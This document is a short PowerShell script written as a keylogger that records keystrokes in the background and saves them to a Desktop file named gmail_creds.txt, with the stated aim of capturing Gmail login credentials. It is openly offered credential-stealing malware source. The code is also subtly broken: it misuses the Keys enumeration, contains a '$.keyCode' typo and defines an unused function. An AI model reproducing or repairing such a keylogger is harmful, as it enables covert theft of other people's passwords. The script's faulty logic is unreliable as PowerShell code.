Add-Type -AssemblyName System.Windows.Forms

$outputFile = "$env:USERPROFILE\Desktop\gmail_creds.txt"
$keys = ""

# Define the Gmail login selector (if scraping HTML) or just log all keys
# For simplicity, we log all keystrokes and save when Enter is pressed

function Get-LoggedKeys {
    while ($true) {
        foreach ($keyCode in [System.Windows.Forms.Control]::Keys) {
            $key = [char][int]$keyCode
            if ($key -ne ' ') { # Skip spaces for cleaner output, or keep them
                $keys += $key
            }
            if ([System.Windows.Forms.Control]::IsKeyDown([System.Windows.Forms.Keys]::Enter)) {
                $keys += "`n"
                Add-Content -Path $outputFile -Value $keys
                $keys = ""
            }
        }
        Start-Sleep -Milliseconds 50
    }
}

# Run in background
Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    $keys = ""
    while ($true) {
        foreach ($keyCode in [System.Windows.Forms.Control]::Keys) {
            $key = [char][int]$keyCode
            if ($.keyCode -gt 32 -and $keyCode -lt 127) {
                $keys += $key
            }
            if ([System.Windows.Forms.Control]::IsKeyDown([System.Windows.Forms.Keys]::Enter)) {
                $keys += "`n"
                Add-Content -Path "$env:USERPROFILE\Desktop\gmail_creds.txt" -Value $keys
                $keys = ""
            }
        }
        Start-Sleep -Milliseconds 50
    }
}

while ($true) { Start-Sleep -Seconds 3600 }